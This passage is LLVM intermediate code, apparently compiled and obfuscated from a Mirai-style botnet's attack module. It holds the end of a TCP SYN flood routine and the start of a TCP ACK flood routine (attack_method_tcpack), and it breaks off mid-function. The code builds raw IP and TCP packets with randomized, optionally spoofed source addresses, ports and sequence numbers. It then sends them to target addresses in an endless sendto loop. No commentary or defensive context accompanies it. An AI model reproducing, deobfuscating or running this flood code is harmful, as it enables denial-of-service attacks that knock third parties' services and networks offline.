  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = bitcast %struct.iphdr* %158 to i8*
  %160 = load i8, i8* %159, align 4
  %161 = xor i8 %160, -1
  %162 = xor i8 -16, -1
  %163 = xor i8 -73, -1
  %164 = or i8 %161, %162
  %165 = or i8 -73, %163
  %166 = xor i8 %164, -1
  %167 = and i8 %166, %165
  %168 = and i8 %160, -16
  %169 = and i8 %167, 5
  %170 = xor i8 %167, 5
  %171 = or i8 %169, %170
  %172 = or i8 %167, 5
  store i8 %171, i8* %159, align 4
  %173 = load i8, i8* %12, align 1
  %174 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 1
  store i8 %173, i8* %175, align 1
  %176 = call zeroext i16 @htons(i16 zeroext 60) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 2
  store i16 %176, i16* %178, align 2
  %179 = load i16, i16* %13, align 2
  %180 = call zeroext i16 @htons(i16 zeroext %179) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 3
  store i16 %180, i16* %182, align 4
  %183 = load i8, i8* %14, align 1
  %184 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 5
  store i8 %183, i8* %185, align 4
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

; <label>:188:                                    ; preds = %113
  %189 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 4
  store i16 %189, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %188, %113
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 6
  store i8 6, i8* %194, align 1
  %195 = load i32, i32* %26, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 8
  store i32 %195, i32* %197, align 4
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 9
  store i32 %203, i32* %205, align 4
  %206 = load i16, i16* %16, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  store i16 %207, i16* %209, align 4
  %210 = load i16, i16* %17, align 2
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 1
  store i16 %211, i16* %213, align 2
  %214 = load i32, i32* %18, align 4
  %215 = trunc i32 %214 to i16
  %216 = call zeroext i16 @htons(i16 zeroext %215) #7
  %217 = zext i16 %216 to i32
  %218 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 2
  store i32 %217, i32* %219, align 4
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = xor i16 %222, -1
  %224 = xor i16 -241, -1
  %225 = xor i16 -13639, -1
  %226 = or i16 %223, %224
  %227 = or i16 -13639, %225
  %228 = xor i16 %226, -1
  %229 = and i16 %228, %227
  %230 = and i16 %222, -241
  %231 = and i16 %229, 160
  %232 = xor i16 %229, 160
  %233 = or i16 %231, %232
  %234 = or i16 %229, 160
  store i16 %233, i16* %221, align 4
  %235 = load i8, i8* %20, align 1
  %236 = sext i8 %235 to i16
  %237 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 4
  %239 = load i16, i16* %238, align 4
  %240 = xor i16 1, -1
  %241 = xor i16 %236, %240
  %242 = and i16 %241, %236
  %243 = and i16 %236, 1
  %244 = shl i16 %242, 13
  %245 = xor i16 -8193, -1
  %246 = xor i16 %239, %245
  %247 = and i16 %246, %239
  %248 = and i16 %239, -8193
  %249 = xor i16 %247, -1
  %250 = xor i16 %244, -1
  %251 = xor i16 -18378, -1
  %252 = and i16 %249, -18378
  %253 = and i16 %247, %251
  %254 = and i16 %250, -18378
  %255 = and i16 %244, %251
  %256 = or i16 %252, %253
  %257 = or i16 %254, %255
  %258 = xor i16 %256, %257
  %259 = or i16 %249, %250
  %260 = xor i16 %259, -1
  %261 = or i16 -18378, %251
  %262 = and i16 %260, %261
  %263 = or i16 %258, %262
  %264 = or i16 %247, %244
  store i16 %263, i16* %238, align 4
  %265 = load i8, i8* %21, align 1
  %266 = sext i8 %265 to i16
  %267 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 4
  %269 = load i16, i16* %268, align 4
  %270 = xor i16 %266, -1
  %271 = xor i16 1, -1
  %272 = xor i16 -30894, -1
  %273 = or i16 %270, %271
  %274 = or i16 -30894, %272
  %275 = xor i16 %273, -1
  %276 = and i16 %275, %274
  %277 = and i16 %266, 1
  %278 = shl i16 %276, 12
  %279 = xor i16 %269, -1
  %280 = xor i16 -4097, -1
  %281 = xor i16 -18134, -1
  %282 = or i16 %279, %280
  %283 = or i16 -18134, %281
  %284 = xor i16 %282, -1
  %285 = and i16 %284, %283
  %286 = and i16 %269, -4097
  %287 = and i16 %285, %278
  %288 = xor i16 %285, %278
  %289 = or i16 %287, %288
  %290 = or i16 %285, %278
  store i16 %289, i16* %268, align 4
  %291 = load i8, i8* %22, align 1
  %292 = sext i8 %291 to i16
  %293 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %294 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = xor i16 1, -1
  %297 = xor i16 %292, %296
  %298 = and i16 %297, %292
  %299 = and i16 %292, 1
  %300 = shl i16 %298, 11
  %301 = xor i16 %295, -1
  %302 = xor i16 -2049, -1
  %303 = xor i16 2692, -1
  %304 = or i16 %301, %302
  %305 = or i16 2692, %303
  %306 = xor i16 %304, -1
  %307 = and i16 %306, %305
  %308 = and i16 %295, -2049
  %309 = and i16 %307, %300
  %310 = xor i16 %307, %300
  %311 = or i16 %309, %310
  %312 = or i16 %307, %300
  store i16 %311, i16* %294, align 4
  %313 = load i8, i8* %23, align 1
  %314 = sext i8 %313 to i16
  %315 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %316 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %315, i32 0, i32 4
  %317 = load i16, i16* %316, align 4
  %318 = xor i16 1, -1
  %319 = xor i16 %314, %318
  %320 = and i16 %319, %314
  %321 = and i16 %314, 1
  %322 = shl i16 %320, 10
  %323 = xor i16 -1025, -1
  %324 = xor i16 %317, %323
  %325 = and i16 %324, %317
  %326 = and i16 %317, -1025
  %327 = xor i16 %325, -1
  %328 = xor i16 %322, -1
  %329 = xor i16 18185, -1
  %330 = and i16 %327, 18185
  %331 = and i16 %325, %329
  %332 = and i16 %328, 18185
  %333 = and i16 %322, %329
  %334 = or i16 %330, %331
  %335 = or i16 %332, %333
  %336 = xor i16 %334, %335
  %337 = or i16 %327, %328
  %338 = xor i16 %337, -1
  %339 = or i16 18185, %329
  %340 = and i16 %338, %339
  %341 = or i16 %336, %340
  %342 = or i16 %325, %322
  store i16 %341, i16* %316, align 4
  %343 = load i8, i8* %24, align 1
  %344 = sext i8 %343 to i16
  %345 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %346 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %345, i32 0, i32 4
  %347 = load i16, i16* %346, align 4
  %348 = xor i16 %344, -1
  %349 = xor i16 1, -1
  %350 = xor i16 12446, -1
  %351 = or i16 %348, %349
  %352 = or i16 12446, %350
  %353 = xor i16 %351, -1
  %354 = and i16 %353, %352
  %355 = and i16 %344, 1
  %356 = shl i16 %354, 9
  %357 = xor i16 -513, -1
  %358 = xor i16 %347, %357
  %359 = and i16 %358, %347
  %360 = and i16 %347, -513
  %361 = and i16 %359, %356
  %362 = xor i16 %359, %356
  %363 = or i16 %361, %362
  %364 = or i16 %359, %356
  store i16 %363, i16* %346, align 4
  %365 = load i8, i8* %25, align 1
  %366 = sext i8 %365 to i16
  %367 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %368 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %367, i32 0, i32 4
  %369 = load i16, i16* %368, align 4
  %370 = xor i16 1, -1
  %371 = xor i16 %366, %370
  %372 = and i16 %371, %366
  %373 = and i16 %366, 1
  %374 = shl i16 %372, 8
  %375 = xor i16 %369, -1
  %376 = xor i16 -257, -1
  %377 = xor i16 11640, -1
  %378 = or i16 %375, %376
  %379 = or i16 11640, %377
  %380 = xor i16 %378, -1
  %381 = and i16 %380, %379
  %382 = and i16 %369, -257
  %383 = xor i16 %381, -1
  %384 = xor i16 %374, -1
  %385 = xor i16 -17367, -1
  %386 = and i16 %383, -17367
  %387 = and i16 %381, %385
  %388 = and i16 %384, -17367
  %389 = and i16 %374, %385
  %390 = or i16 %386, %387
  %391 = or i16 %388, %389
  %392 = xor i16 %390, %391
  %393 = or i16 %383, %384
  %394 = xor i16 %393, -1
  %395 = or i16 -17367, %385
  %396 = and i16 %394, %395
  %397 = or i16 %392, %396
  %398 = or i16 %381, %374
  store i16 %397, i16* %368, align 4
  %399 = load i8*, i8** %29, align 8
  %400 = getelementptr inbounds i8, i8* %399, i32 1
  store i8* %400, i8** %29, align 8
  store i8 2, i8* %399, align 1
  %401 = load i8*, i8** %29, align 8
  %402 = getelementptr inbounds i8, i8* %401, i32 1
  store i8* %402, i8** %29, align 8
  store i8 4, i8* %401, align 1
  %403 = call i32 @rand_next()
  %404 = xor i32 %403, -1
  %405 = xor i32 15, -1
  %406 = xor i32 -764518738, -1
  %407 = or i32 %404, %405
  %408 = or i32 -764518738, %406
  %409 = xor i32 %407, -1
  %410 = and i32 %409, %408
  %411 = and i32 %403, 15
  %412 = sub i32 0, 1400
  %413 = sub i32 0, %410
  %414 = add i32 %412, %413
  %415 = sub i32 0, %414
  %416 = add i32 1400, %410
  %417 = trunc i32 %415 to i16
  %418 = call zeroext i16 @htons(i16 zeroext %417) #7
  %419 = load i8*, i8** %29, align 8
  %420 = bitcast i8* %419 to i16*
  store i16 %418, i16* %420, align 2
  %421 = load i8*, i8** %29, align 8
  %422 = getelementptr inbounds i8, i8* %421, i64 2
  store i8* %422, i8** %29, align 8
  %423 = load i8*, i8** %29, align 8
  %424 = getelementptr inbounds i8, i8* %423, i32 1
  store i8* %424, i8** %29, align 8
  store i8 4, i8* %423, align 1
  %425 = load i8*, i8** %29, align 8
  %426 = getelementptr inbounds i8, i8* %425, i32 1
  store i8* %426, i8** %29, align 8
  store i8 2, i8* %425, align 1
  %427 = load i8*, i8** %29, align 8
  %428 = getelementptr inbounds i8, i8* %427, i32 1
  store i8* %428, i8** %29, align 8
  store i8 8, i8* %427, align 1
  %429 = load i8*, i8** %29, align 8
  %430 = getelementptr inbounds i8, i8* %429, i32 1
  store i8* %430, i8** %29, align 8
  store i8 10, i8* %429, align 1
  %431 = call i32 @rand_next()
  %432 = load i8*, i8** %29, align 8
  %433 = bitcast i8* %432 to i32*
  store i32 %431, i32* %433, align 4
  %434 = load i8*, i8** %29, align 8
  %435 = getelementptr inbounds i8, i8* %434, i64 4
  store i8* %435, i8** %29, align 8
  %436 = load i8*, i8** %29, align 8
  %437 = bitcast i8* %436 to i32*
  store i32 0, i32* %437, align 4
  %438 = load i8*, i8** %29, align 8
  %439 = getelementptr inbounds i8, i8* %438, i64 4
  store i8* %439, i8** %29, align 8
  %440 = load i8*, i8** %29, align 8
  %441 = getelementptr inbounds i8, i8* %440, i32 1
  store i8* %441, i8** %29, align 8
  store i8 1, i8* %440, align 1
  %442 = load i8*, i8** %29, align 8
  %443 = getelementptr inbounds i8, i8* %442, i32 1
  store i8* %443, i8** %29, align 8
  store i8 3, i8* %442, align 1
  %444 = load i8*, i8** %29, align 8
  %445 = getelementptr inbounds i8, i8* %444, i32 1
  store i8* %445, i8** %29, align 8
  store i8 3, i8* %444, align 1
  %446 = load i8*, i8** %29, align 8
  %447 = getelementptr inbounds i8, i8* %446, i32 1
  store i8* %447, i8** %29, align 8
  store i8 6, i8* %446, align 1
  br label %448

; <label>:448:                                    ; preds = %192
  %449 = load i32, i32* %9, align 4
  %450 = add i32 %449, -1744242418
  %451 = add i32 %450, 1
  %452 = sub i32 %451, -1744242418
  %453 = add nsw i32 %449, 1
  store i32 %452, i32* %9, align 4
  br label %108

; <label>:454:                                    ; preds = %108
  br label %455

; <label>:455:                                    ; preds = %622, %454
  store i32 0, i32* %9, align 4
  br label %456

; <label>:456:                                    ; preds = %617, %455
  %457 = load i32, i32* %9, align 4
  %458 = load i8, i8* %5, align 1
  %459 = zext i8 %458 to i32
  %460 = icmp slt i32 %457, %459
  br i1 %460, label %461, label %622

; <label>:461:                                    ; preds = %456
  %462 = load i8**, i8*** %11, align 8
  %463 = load i32, i32* %9, align 4
  %464 = sext i32 %463 to i64
  %465 = getelementptr inbounds i8*, i8** %462, i64 %464
  %466 = load i8*, i8** %465, align 8
  store i8* %466, i8** %30, align 8
  %467 = load i8*, i8** %30, align 8
  %468 = bitcast i8* %467 to %struct.iphdr*
  store %struct.iphdr* %468, %struct.iphdr** %31, align 8
  %469 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i64 1
  %471 = bitcast %struct.iphdr* %470 to %struct.tcphdr*
  store %struct.tcphdr* %471, %struct.tcphdr** %32, align 8
  %472 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %473 = load i32, i32* %9, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %472, i64 %474
  %476 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %475, i32 0, i32 2
  %477 = load i8, i8* %476, align 4
  %478 = zext i8 %477 to i32
  %479 = icmp slt i32 %478, 32
  br i1 %479, label %480, label %503

; <label>:480:                                    ; preds = %461
  %481 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %482 = load i32, i32* %9, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %481, i64 %483
  %485 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %484, i32 0, i32 1
  %486 = load i32, i32* %485, align 4
  %487 = call i32 @ntohl(i32 %486) #7
  %488 = call i32 @rand_next()
  %489 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %490 = load i32, i32* %9, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %489, i64 %491
  %493 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %492, i32 0, i32 2
  %494 = load i8, i8* %493, align 4
  %495 = zext i8 %494 to i32
  %496 = lshr i32 %488, %495
  %497 = sub i32 0, %496
  %498 = sub i32 %487, %497
  %499 = add i32 %487, %496
  %500 = call i32 @htonl(i32 %498) #7
  %501 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %502 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %501, i32 0, i32 9
  store i32 %500, i32* %502, align 4
  br label %503

; <label>:503:                                    ; preds = %480, %461
  %504 = load i32, i32* %26, align 4
  %505 = icmp eq i32 %504, -1
  br i1 %505, label %506, label %510

; <label>:506:                                    ; preds = %503
  %507 = call i32 @rand_next()
  %508 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %509 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %508, i32 0, i32 8
  store i32 %507, i32* %509, align 4
  br label %510

; <label>:510:                                    ; preds = %506, %503
  %511 = load i16, i16* %13, align 2
  %512 = zext i16 %511 to i32
  %513 = icmp eq i32 %512, 65535
  br i1 %513, label %514, label %523

; <label>:514:                                    ; preds = %510
  %515 = call i32 @rand_next()
  %516 = xor i32 65535, -1
  %517 = xor i32 %515, %516
  %518 = and i32 %517, %515
  %519 = and i32 %515, 65535
  %520 = trunc i32 %518 to i16
  %521 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %522 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %521, i32 0, i32 3
  store i16 %520, i16* %522, align 4
  br label %523

; <label>:523:                                    ; preds = %514, %510
  %524 = load i16, i16* %16, align 2
  %525 = zext i16 %524 to i32
  %526 = icmp eq i32 %525, 65535
  br i1 %526, label %527, label %536

; <label>:527:                                    ; preds = %523
  %528 = call i32 @rand_next()
  %529 = xor i32 65535, -1
  %530 = xor i32 %528, %529
  %531 = and i32 %530, %528
  %532 = and i32 %528, 65535
  %533 = trunc i32 %531 to i16
  %534 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %535 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %534, i32 0, i32 0
  store i16 %533, i16* %535, align 4
  br label %536

; <label>:536:                                    ; preds = %527, %523
  %537 = load i16, i16* %17, align 2
  %538 = zext i16 %537 to i32
  %539 = icmp eq i32 %538, 65535
  br i1 %539, label %540, label %549

; <label>:540:                                    ; preds = %536
  %541 = call i32 @rand_next()
  %542 = xor i32 65535, -1
  %543 = xor i32 %541, %542
  %544 = and i32 %543, %541
  %545 = and i32 %541, 65535
  %546 = trunc i32 %544 to i16
  %547 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %548 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %547, i32 0, i32 1
  store i16 %546, i16* %548, align 2
  br label %549

; <label>:549:                                    ; preds = %540, %536
  %550 = load i32, i32* %18, align 4
  %551 = icmp eq i32 %550, 65535
  br i1 %551, label %552, label %556

; <label>:552:                                    ; preds = %549
  %553 = call i32 @rand_next()
  %554 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 2
  store i32 %553, i32* %555, align 4
  br label %556

; <label>:556:                                    ; preds = %552, %549
  %557 = load i32, i32* %19, align 4
  %558 = icmp eq i32 %557, 65535
  br i1 %558, label %559, label %563

; <label>:559:                                    ; preds = %556
  %560 = call i32 @rand_next()
  %561 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %562 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %561, i32 0, i32 3
  store i32 %560, i32* %562, align 4
  br label %563

; <label>:563:                                    ; preds = %559, %556
  %564 = load i8, i8* %20, align 1
  %565 = icmp ne i8 %564, 0
  br i1 %565, label %566, label %579

; <label>:566:                                    ; preds = %563
  %567 = call i32 @rand_next()
  %568 = xor i32 %567, -1
  %569 = xor i32 65535, -1
  %570 = xor i32 177780344, -1
  %571 = or i32 %568, %569
  %572 = or i32 177780344, %570
  %573 = xor i32 %571, -1
  %574 = and i32 %573, %572
  %575 = and i32 %567, 65535
  %576 = trunc i32 %574 to i16
  %577 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 7
  store i16 %576, i16* %578, align 2
  br label %579

; <label>:579:                                    ; preds = %566, %563
  %580 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %581 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %580, i32 0, i32 7
  store i16 0, i16* %581, align 2
  %582 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %583 = bitcast %struct.iphdr* %582 to i16*
  %584 = call zeroext i16 @checksum_generic(i16* %583, i32 20)
  %585 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %586 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %585, i32 0, i32 7
  store i16 %584, i16* %586, align 2
  %587 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %588 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %587, i32 0, i32 6
  store i16 0, i16* %588, align 4
  %589 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %590 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %591 = bitcast %struct.tcphdr* %590 to i8*
  %592 = call zeroext i16 @htons(i16 zeroext 40) #7
  %593 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %589, i8* %591, i16 zeroext %592, i32 40)
  %594 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %595 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %594, i32 0, i32 6
  store i16 %593, i16* %595, align 4
  %596 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 1
  %598 = load i16, i16* %597, align 2
  %599 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %600 = load i32, i32* %9, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i64 %601
  %603 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %602, i32 0, i32 0
  %604 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %603, i32 0, i32 1
  store i16 %598, i16* %604, align 2
  %605 = load i32, i32* %10, align 4
  %606 = load i8*, i8** %30, align 8
  %607 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %608 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %609 = load i32, i32* %9, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %608, i64 %610
  %612 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %611, i32 0, i32 0
  %613 = bitcast %struct.sockaddr_in* %612 to %struct.sockaddr*
  store %struct.sockaddr* %613, %struct.sockaddr** %607, align 8
  %614 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %615 = load %struct.sockaddr*, %struct.sockaddr** %614, align 8
  %616 = call i64 @sendto(i32 %605, i8* %606, i64 60, i32 16384, %struct.sockaddr* %615, i32 16)
  br label %617

; <label>:617:                                    ; preds = %579
  %618 = load i32, i32* %9, align 4
  %619 = sub i32 0, 1
  %620 = sub i32 %618, %619
  %621 = add nsw i32 %618, 1
  store i32 %620, i32* %9, align 4
  br label %456

; <label>:622:                                    ; preds = %456
  br label %455

; <label>:623:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
